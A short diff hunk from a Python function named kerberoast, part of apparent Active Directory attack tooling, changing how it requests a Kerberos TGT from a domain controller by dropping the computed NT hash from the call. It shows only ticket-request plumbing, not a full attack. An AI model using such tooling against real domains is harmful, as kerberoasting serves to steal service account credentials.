@@ -13,7 +13,7 @@ def kerberoast(username, password, domain, dc_ip):
         nthash = compute_nthash(password)
 
         # Get TGT ticket for the specified user
-        krbtgt_ticket = getKerberosTGT(username, domain, dc_ip, nthash)
+        krbtgt_ticket = getKerberosTGT(username, domain, dc_ip)
         if krbtgt_ticket:
             print("Successfully obtained krbtgt ticket.")
             
